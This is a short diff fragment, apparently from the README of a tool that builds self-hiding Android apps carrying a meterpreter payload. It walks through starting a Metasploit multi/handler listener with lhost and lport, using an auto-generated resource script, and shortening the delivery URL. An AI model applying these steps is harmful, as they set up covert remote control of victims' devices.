@@ -32,7 +32,7 @@ ALSO THE APP CREATED BY MY TOOL CAN AUTOMATICALLY DISAPPEAR AFTER INSTALLING
  then start your msfconsole 
  use exploit/multi/handler
  then set lhost and lport and start the meterpreter session
- **OR simply use the resource script generated automatically by the tool
+ # OR simply use the resource script generated automatically by the tool
    -> msfconsole -r <appname_listener.rc>
  # You can shorten the URL by :
     1.open another terminal without closing the current one
